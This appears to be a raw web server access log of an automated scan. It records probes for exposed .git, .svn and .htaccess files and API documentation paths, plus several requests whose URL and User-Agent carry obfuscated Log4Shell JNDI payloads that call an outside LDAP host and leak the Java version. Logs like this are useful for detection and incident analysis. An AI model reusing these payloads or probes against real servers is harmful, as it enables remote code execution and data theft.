34.68.34.72 - - [16/Feb/2024:04:05:56 +0000] "GET /.git/config HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:56 +0000] "GET /.svn/prop-base HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.80 - - [16/Feb/2024:04:05:56 +0000] "GET /${${1:eq:4q9:-j}${0gs3:-n}${l7jq:ou:-d}${3j7:ap:j6:-i}${gi:xnev:-:}${8p41:4f:-l}${rs:d0s:-d}${gr:xhm:-a}${wr:rs:-p}${6ne:2n5:-:}${f6or:1fx:oldf:-/}${y7:tn:jk7:-/}${0:370m:-P}${4:6:-A}${wrxf:7m:et:-l}${r2sv:1fdw:-0}${w:qp:-c}${nawo:--}${${20p:-s}${6uw1:-y}${6zq:-s}${oq:85:at0q:-:}${9:vujt:sbjl:-j}${bay:2:zv0k:-a}${ylm:-v}${1:-a}${8bk:s:e4w:-.}${li:0:-v}${1:l4:-e}${e2:z:he08:-r}${21x8:oc8a:q3e:-s}${7f8e:3b:rck3:-i}${g:-o}${hf5:f:y:-n}}${1094:fh9:-.}${2m:gqf:p:-9}${jq2:-e}${i2:uws:-b}${kr:x:-f}${bn:-a}${uw1:-4}${l:2ve:e5ni:-9}${klb:1f:f:-7}${8da:-0}${at:m6:icv:-a}${pcd:zqku:-d}${qot:-a}${trp6:z2c:-5}${m461:f2y:kq4:-a}${tax:j:-d}${l7nd:-8}${var:b0xv:l:-4}${p:1c:-9}${q:-2}${ga5u:o:k:-3}${nf:0jd:-3}${9b:g:j:-5}${ywb:-3}${d:-a}${ln7:mxjy:ik:-0}${5ano:r:-5}${mer:ok4h:4hd8:-2}${lrfu:-3}${xnm:-6}${eim:-9}${ls:b:pqfz:-b}${h:-7}${12:9pgz:i:-3}${e1:-3}${q7a6:9:-8}${lk:-f}${80b:n6h5:5iv:-d}${wb:-9}${a4:6p:-0}${gh1:adxy:-e}${2r3u:xtb2:-2}${63x:3y2:-a}${5c:p:-.}${eb:xpm:-z}${1gv:-.}${bvl:1cyl:-7}${gct9:v9xr:-b}${9j7:-a}${f4:-e}${lezj:-.}${vt0h:-x}${dq:u:-y}${3l2y:s:fi:-z}} HTTP/1.1" 301 162 "-" "${${5mlb:-j}${2oq:-n}${y:g1:-d}${k2g1:-i}${60f:-:}${wby:wsg:m:-l}${xhw:-d}${x:-a}${no:-p}${9:nm:-:}${8m6:-/}${c:-/}${wp9:-U}${52:-A}${o:-l}${f0u:t8:-0}${gr:-c}${w3j:1:--}${${adj:-s}${spx8:rg36:v:-y}${r:1nw:-s}${2g4:vemr:olfy:-:}${idw4:c0fn:-j}${z3m:-a}${k:3v1:-v}${tfy9:c:-a}${mc04:-.}${og:figo:-v}${yc:w:pf:-e}${sr1:5if:-r}${3:n:-s}${he0:zd:-i}${1:b:-o}${4:t0ml:k6:-n}}${uakn:4wc:vz:-.}${2:74kh:-9}${u1ek:zqv:-e}${dg:-b}${2:-f}${yr:-a}${a:4:z3:-4}${7:4n:-9}${c:unmg:-7}${29q:-0}${h:m4:pmn:-a}${ce:i:-d}${tu95:h:d:-a}${1n:u:-5}${ki7m:-a}${bgvq:-d}${kxz:p8:-8}${z7cu:74e:-4}${ix:e43:-9}${6:0:-2}${9:-3}${c9fn:8s:2n:-3}${uil6:5d:hbr:-5}${zoh3:-3}${hey6:5s:g4:-a}${u:2co:8bd1:-0}${f0:uq0k:iwk6:-5}${r:-2}${cd3:2xg3:-3}${2:64b:rkx:-6}${9:-9}${ojw:81v:-b}${9s:wn:4:-7}${sup:6:-3}${6:i:r:-3}${0uj:-8}${e0:c6eq:kez:-f}${d:-d}${c:rsjh:eb:-9}${l:is9:ejz:-0}${hx:ypi9:-e}${t5qv:xwb:-2}${6:q:-a}${1r:-.}${m:su:-z}${ysol:tl:-.}${6:w1ly:-7}${xh4:pl:-b}${uij:fz:-a}${87:vz:wv9y:-e}${uy:-.}${l:a:-x}${p7:boj9:z:-y}${j2k:nl:r:-z}}"
34.68.34.66 - - [16/Feb/2024:04:05:57 +0000] "GET /.svn/text-base HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:57 +0000] "GET /docs HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:05:57 +0000] "GET /.hg HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:57 +0000] "GET /swagger-ui HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:57 +0000] "GET /.htaccess HTTP/1.1" 403 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.80 - - [16/Feb/2024:04:05:57 +0000] "GET /${${1:eq:4q9:-j}${0gs3:-n}${l7jq:ou:-d}${3j7:ap:j6:-i}${gi:xnev:-:}${8p41:4f:-l}${rs:d0s:-d}${gr:xhm:-a}${wr:rs:-p}${6ne:2n5:-:}${f6or:1fx:oldf:-/}${y7:tn:jk7:-/}${0:370m:-P}${4:6:-A}${wrxf:7m:et:-l}${r2sv:1fdw:-0}${w:qp:-c}${nawo:--}${${20p:-s}${6uw1:-y}${6zq:-s}${oq:85:at0q:-:}${9:vujt:sbjl:-j}${bay:2:zv0k:-a}${ylm:-v}${1:-a}${8bk:s:e4w:-.}${li:0:-v}${1:l4:-e}${e2:z:he08:-r}${21x8:oc8a:q3e:-s}${7f8e:3b:rck3:-i}${g:-o}${hf5:f:y:-n}}${1094:fh9:-.}${2m:gqf:p:-9}${jq2:-e}${i2:uws:-b}${kr:x:-f}${bn:-a}${uw1:-4}${l:2ve:e5ni:-9}${klb:1f:f:-7}${8da:-0}${at:m6:icv:-a}${pcd:zqku:-d}${qot:-a}${trp6:z2c:-5}${m461:f2y:kq4:-a}${tax:j:-d}${l7nd:-8}${var:b0xv:l:-4}${p:1c:-9}${q:-2}${ga5u:o:k:-3}${nf:0jd:-3}${9b:g:j:-5}${ywb:-3}${d:-a}${ln7:mxjy:ik:-0}${5ano:r:-5}${mer:ok4h:4hd8:-2}${lrfu:-3}${xnm:-6}${eim:-9}${ls:b:pqfz:-b}${h:-7}${12:9pgz:i:-3}${e1:-3}${q7a6:9:-8}${lk:-f}${80b:n6h5:5iv:-d}${wb:-9}${a4:6p:-0}${gh1:adxy:-e}${2r3u:xtb2:-2}${63x:3y2:-a}${5c:p:-.}${eb:xpm:-z}${1gv:-.}${bvl:1cyl:-7}${gct9:v9xr:-b}${9j7:-a}${f4:-e}${lezj:-.}${vt0h:-x}${dq:u:-y}${3l2y:s:fi:-z}} HTTP/1.1" 404 207 "-" "${${5mlb:-j}${2oq:-n}${y:g1:-d}${k2g1:-i}${60f:-:}${wby:wsg:m:-l}${xhw:-d}${x:-a}${no:-p}${9:nm:-:}${8m6:-/}${c:-/}${wp9:-U}${52:-A}${o:-l}${f0u:t8:-0}${gr:-c}${w3j:1:--}${${adj:-s}${spx8:rg36:v:-y}${r:1nw:-s}${2g4:vemr:olfy:-:}${idw4:c0fn:-j}${z3m:-a}${k:3v1:-v}${tfy9:c:-a}${mc04:-.}${og:figo:-v}${yc:w:pf:-e}${sr1:5if:-r}${3:n:-s}${he0:zd:-i}${1:b:-o}${4:t0ml:k6:-n}}${uakn:4wc:vz:-.}${2:74kh:-9}${u1ek:zqv:-e}${dg:-b}${2:-f}${yr:-a}${a:4:z3:-4}${7:4n:-9}${c:unmg:-7}${29q:-0}${h:m4:pmn:-a}${ce:i:-d}${tu95:h:d:-a}${1n:u:-5}${ki7m:-a}${bgvq:-d}${kxz:p8:-8}${z7cu:74e:-4}${ix:e43:-9}${6:0:-2}${9:-3}${c9fn:8s:2n:-3}${uil6:5d:hbr:-5}${zoh3:-3}${hey6:5s:g4:-a}${u:2co:8bd1:-0}${f0:uq0k:iwk6:-5}${r:-2}${cd3:2xg3:-3}${2:64b:rkx:-6}${9:-9}${ojw:81v:-b}${9s:wn:4:-7}${sup:6:-3}${6:i:r:-3}${0uj:-8}${e0:c6eq:kez:-f}${d:-d}${c:rsjh:eb:-9}${l:is9:ejz:-0}${hx:ypi9:-e}${t5qv:xwb:-2}${6:q:-a}${1r:-.}${m:su:-z}${ysol:tl:-.}${6:w1ly:-7}${xh4:pl:-b}${uij:fz:-a}${87:vz:wv9y:-e}${uy:-.}${l:a:-x}${p7:boj9:z:-y}${j2k:nl:r:-z}}"
34.68.34.66 - - [16/Feb/2024:04:05:57 +0000] "GET /graphql HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:58 +0000] "GET /.htaccess.bak HTTP/1.1" 403 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:58 +0000] "GET / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:58 +0000] "GET /swagger-ui.html HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:05:58 +0000] "GET /.hg HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.80 - - [16/Feb/2024:04:05:58 +0000] "GET /${${jhq:1:412:-j}${w:1fp5:-n}${cbr:va3x:nbr3:-d}${lkbn:-i}${56m:-:}${2z:-l}${6:-d}${i:b:tu7a:-a}${cq:-p}${nd7:mf2g:-:}${nmv:i01:4b:-/}${4qu2:z15k:cw:-/}${hu:-P}${eaz:-A}${wd0b:mf:-l}${rqw:-0}${vmq5:k3:reaq:-c}${z0tj:--}${${rl:-s}${zke8:g8:-y}${yh50:w7kp:-s}${on:w:-:}${y9j:b:-j}${o:h67d:0h2t:-a}${02r:0:t:-v}${12h:-a}${sac:-.}${q:gf:tbuo:-v}${i7:apo0:xv4:-e}${k0y:0:-r}${aq:-s}${a:-i}${r:c:5br:-o}${8k:s:3e:-n}}${u3:8y:-.}${m8v:-9}${4tsa:0e:-e}${xj:-b}${d:1:-f}${72:-a}${qv:a89c:-4}${b:v3x:-9}${pwxq:-7}${jo4n:nab:-0}${zt:wmy:1x:-a}${h6g:-d}${b:-a}${gr:-5}${8ob:zg03:-a}${aug:2w:-d}${jc:-8}${2cq:-4}${7ak:-9}${5wxr:rpq:npu6:-2}${jyi:3ht:65fb:-3}${w:-3}${j6:-5}${1d:4gy:gmf:-3}${37:nj1:24ow:-a}${xsyo:-0}${k4:qs:-5}${hzeo:iw:-2}${f6:iy:l6:-3}${sf7r:hwf8:-6}${6:krn:p36m:-9}${69:-b}${zc:-7}${2z:-3}${8:hdq:-3}${ft:spwl:-8}${9:9g:-f}${dx:t:-d}${3bk:-9}${4ulq:7nt0:x1:-0}${stbg:k:-e}${u:-2}${qe:rsj7:s:-a}${i1:x3q:vf:-.}${c3d:dng:-z}${ga6v:6:vuh:-.}${8:h9:imp:-7}${rnk6:-b}${lbr:-a}${tu:4e:g:-e}${w:-.}${u:0jp:anru:-x}${slh0:-y}${mw8u:h1v:pb:-z}} HTTP/1.1" 301 162 "-" "${${d9w1:brgs:ihm:-j}${obs:-n}${f1t:s:rea:-d}${7w:u:wj:-i}${3:xhc:-:}${exu:y95:-l}${4vdi:-d}${hl:wo:-a}${quk:3h:-p}${o:a6:f97d:-:}${3:7:-/}${m5q:glh:-/}${2b:-U}${a61s:l9xz:t:-A}${1:-l}${w:3:cxr3:-0}${c:pja0:qeb:-c}${1zp:qxj:--}${${vkej:nqti:-s}${b7ou:ihr0:-y}${36:-s}${qch:63fz:-:}${z8:xeh:-j}${k:-a}${xr:si:1al:-v}${c6:-a}${mnb:u2v:h3mq:-.}${lyeb:3:tmge:-v}${ut:o06:t0:-e}${4crs:yn:-r}${on4:k:zi:-s}${egax:6u8a:-i}${81li:zxqv:-o}${qybu:rhs:-n}}${u0j:djxz:fy:-.}${t:-9}${reb:byw:w:-e}${wo:-b}${7eu:4qgv:-f}${q:-a}${sm6:ct:-4}${rw3:ox2l:-9}${qwr:-7}${jldp:dp2:-0}${mn:od:cav:-a}${z:gk:t4nj:-d}${lz:szv:5w:-a}${v913:-5}${x:ngs:c0p6:-a}${j:-d}${v:0:ctd:-8}${cwb:-4}${4b:-9}${fwq:nx:j6vc:-2}${hnz:z:pe:-3}${u:-3}${8gjy:o4:-5}${si:g:-3}${1i:pz5g:-a}${0e:fj2:p27:-0}${u:s6jw:-5}${v:-2}${lzb:u:-3}${v:jy:xzy1:-6}${m8:l:d:-9}${mp:3:-b}${1:4a:-7}${vo:-3}${cq:edh:-3}${z:30sa:-8}${8:-f}${8njp:-d}${o8sk:-9}${6ubx:-0}${fd:-e}${oq4:a:qrt:-2}${vfo:-a}${xt:9d0:-.}${azd:m6:4es1:-z}${qp8e:w8:sw:-.}${781:8it:-7}${lez3:8l7n:g4f:-b}${zp:8m:9olj:-a}${tif:9i:a:-e}${shgr:2hg:-.}${is:qx:f:-x}${w:k:g:-y}${zu:-z}}"
34.68.34.72 - - [16/Feb/2024:04:05:59 +0000] "GET /.bzr HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:59 +0000] "GET /swagger.json HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.80 - - [16/Feb/2024:04:05:59 +0000] "GET /${${jhq:1:412:-j}${w:1fp5:-n}${cbr:va3x:nbr3:-d}${lkbn:-i}${56m:-:}${2z:-l}${6:-d}${i:b:tu7a:-a}${cq:-p}${nd7:mf2g:-:}${nmv:i01:4b:-/}${4qu2:z15k:cw:-/}${hu:-P}${eaz:-A}${wd0b:mf:-l}${rqw:-0}${vmq5:k3:reaq:-c}${z0tj:--}${${rl:-s}${zke8:g8:-y}${yh50:w7kp:-s}${on:w:-:}${y9j:b:-j}${o:h67d:0h2t:-a}${02r:0:t:-v}${12h:-a}${sac:-.}${q:gf:tbuo:-v}${i7:apo0:xv4:-e}${k0y:0:-r}${aq:-s}${a:-i}${r:c:5br:-o}${8k:s:3e:-n}}${u3:8y:-.}${m8v:-9}${4tsa:0e:-e}${xj:-b}${d:1:-f}${72:-a}${qv:a89c:-4}${b:v3x:-9}${pwxq:-7}${jo4n:nab:-0}${zt:wmy:1x:-a}${h6g:-d}${b:-a}${gr:-5}${8ob:zg03:-a}${aug:2w:-d}${jc:-8}${2cq:-4}${7ak:-9}${5wxr:rpq:npu6:-2}${jyi:3ht:65fb:-3}${w:-3}${j6:-5}${1d:4gy:gmf:-3}${37:nj1:24ow:-a}${xsyo:-0}${k4:qs:-5}${hzeo:iw:-2}${f6:iy:l6:-3}${sf7r:hwf8:-6}${6:krn:p36m:-9}${69:-b}${zc:-7}${2z:-3}${8:hdq:-3}${ft:spwl:-8}${9:9g:-f}${dx:t:-d}${3bk:-9}${4ulq:7nt0:x1:-0}${stbg:k:-e}${u:-2}${qe:rsj7:s:-a}${i1:x3q:vf:-.}${c3d:dng:-z}${ga6v:6:vuh:-.}${8:h9:imp:-7}${rnk6:-b}${lbr:-a}${tu:4e:g:-e}${w:-.}${u:0jp:anru:-x}${slh0:-y}${mw8u:h1v:pb:-z}} HTTP/1.1" 404 207 "-" "${${d9w1:brgs:ihm:-j}${obs:-n}${f1t:s:rea:-d}${7w:u:wj:-i}${3:xhc:-:}${exu:y95:-l}${4vdi:-d}${hl:wo:-a}${quk:3h:-p}${o:a6:f97d:-:}${3:7:-/}${m5q:glh:-/}${2b:-U}${a61s:l9xz:t:-A}${1:-l}${w:3:cxr3:-0}${c:pja0:qeb:-c}${1zp:qxj:--}${${vkej:nqti:-s}${b7ou:ihr0:-y}${36:-s}${qch:63fz:-:}${z8:xeh:-j}${k:-a}${xr:si:1al:-v}${c6:-a}${mnb:u2v:h3mq:-.}${lyeb:3:tmge:-v}${ut:o06:t0:-e}${4crs:yn:-r}${on4:k:zi:-s}${egax:6u8a:-i}${81li:zxqv:-o}${qybu:rhs:-n}}${u0j:djxz:fy:-.}${t:-9}${reb:byw:w:-e}${wo:-b}${7eu:4qgv:-f}${q:-a}${sm6:ct:-4}${rw3:ox2l:-9}${qwr:-7}${jldp:dp2:-0}${mn:od:cav:-a}${z:gk:t4nj:-d}${lz:szv:5w:-a}${v913:-5}${x:ngs:c0p6:-a}${j:-d}${v:0:ctd:-8}${cwb:-4}${4b:-9}${fwq:nx:j6vc:-2}${hnz:z:pe:-3}${u:-3}${8gjy:o4:-5}${si:g:-3}${1i:pz5g:-a}${0e:fj2:p27:-0}${u:s6jw:-5}${v:-2}${lzb:u:-3}${v:jy:xzy1:-6}${m8:l:d:-9}${mp:3:-b}${1:4a:-7}${vo:-3}${cq:edh:-3}${z:30sa:-8}${8:-f}${8njp:-d}${o8sk:-9}${6ubx:-0}${fd:-e}${oq4:a:qrt:-2}${vfo:-a}${xt:9d0:-.}${azd:m6:4es1:-z}${qp8e:w8:sw:-.}${781:8it:-7}${lez3:8l7n:g4f:-b}${zp:8m:9olj:-a}${tif:9i:a:-e}${shgr:2hg:-.}${is:qx:f:-x}${w:k:g:-y}${zu:-z}}"
34.68.34.79 - - [16/Feb/2024:04:06:00 +0000] "GET /swagger/index.html HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:00 +0000] "GET /.bzr HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.80 - - [16/Feb/2024:04:06:00 +0000] "ZSDLKFJ2 /${${ow:045p:-j}${m:qf:qhu:-n}${yeb:-d}${u:hrp3:3c:-i}${pa59:-:}${dtjw:ikg8:5y:-l}${l6o:1u0:vfab:-d}${sy27:1z:rp:-a}${amf:t9q:mo:-p}${fh:-:}${d:2:-/}${f0:-/}${reh:3bj:gt2c:-P}${6yse:e5:-A}${xle:mi9:-l}${4ur:vdse:-0}${7ifp:-c}${v7:xyqn:--}${${omup:-s}${wnig:-y}${zsl:skzw:-s}${z:-:}${3rum:2hn:-j}${b3:gx:-a}${m:r:-v}${57:r1:fovi:-a}${2:-.}${u7x:hfxp:-v}${q072:q0:-e}${vg5a:10lb:-r}${o3i:vam0:-s}${q2fv:eab:04:-i}${ptal:-o}${u:a6:ds72:-n}}${ol29:80:-.}${b9:y:jv6:-9}${tzfi:u2fo:nkbw:-e}${g:-b}${r:-f}${fhy3:f:yu:-a}${up3:-4}${2el:8r:-9}${2jn:06h:uyi:-7}${lp:qpnj:845:-0}${q:04r:-a}${45x:np:k4wd:-d}${l:-a}${upq:co6:472k:-5}${ba:j2a:dcu:-a}${dt:zq3n:9e4:-d}${5:i1:eo:-8}${ep:s:n:-4}${dvto:-9}${ltu:f:vu2:-2}${6o:qk3:af:-3}${9v:-3}${alh3:-5}${v:-3}${ht:8my:q:-a}${3xw:ik:vfmt:-0}${3r:-5}${d:-2}${j7t:-3}${lha3:-6}${6:86h:v:-9}${m:gr9:-b}${fx:q:3:-7}${2dsr:-3}${dkl7:-3}${rj:04t:-8}${jbc:-f}${k:h1:-d}${v:v:2:-9}${5s:s:-0}${3f7:i:-e}${6:-2}${d:ivq:-a}${6ei:k2b:-.}${4j6:-z}${x70:-.}${q:v:4:-7}${m7:d:-b}${xe:-a}${l:gmv:-" 400 150 "-" "-"
34.68.34.72 - - [16/Feb/2024:04:06:01 +0000] "GET /.svn HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:06:01 +0000] "GET /swagger/swagger-ui.html HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:02 +0000] "GET /.svn HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:06:02 +0000] "GET /swagger/ui/index HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:02 +0000] "GET /.svn/entries HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:06:02 +0000] "GET /rest HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:06:02 +0000] "GET /swagger/v1/swagger.json HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:06:03 +0000] "GET /swagger HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:03 +0000] "GET /.svn/entries HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:06:03 +0000] "GET /v1/swagger.json HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:06:03 +0000] "GET /swagger/ HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:04 +0000] "GET /.svn/prop-base HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:06:04 +0000] "GET /swagger-resources HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:06:04 +0000] "GET /swagger-ui HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:05 +0000] "GET /.svn/prop-base HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:06:05 +0000] "GET /swagger-ui.html HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:05 +0000] "GET /.svn/text-base HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:06:06 +0000] "GET /swagger.json HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:06 +0000] "GET /.svn/text-base HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:06:06 +0000] "GET /swagger/index.html HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:06:07 +0000] "GET /swagger/swagger-ui.html HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:06:07 +0000] "GET /rest HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:06:07 +0000] "GET /swagger/ui/index HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:06:07 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03r\xCA\xB4\xFAc\xD2g\xE8I\x87_\xC2$y c^\xE3\xF0\xE2y\xF0\xD46\x02P\xECU\xE8\xB1\xCFj \x90\x81\x0F\xA9/\xCE\xC8z\x14W\x81\x99\xC1\x91" 400 150 "-" "-"
34.68.34.72 - - [16/Feb/2024:04:06:08 +0000] "GET /rest HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:06:08 +0000] "GET /swagger/v1/swagger.json HTTP/1.1" 404 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
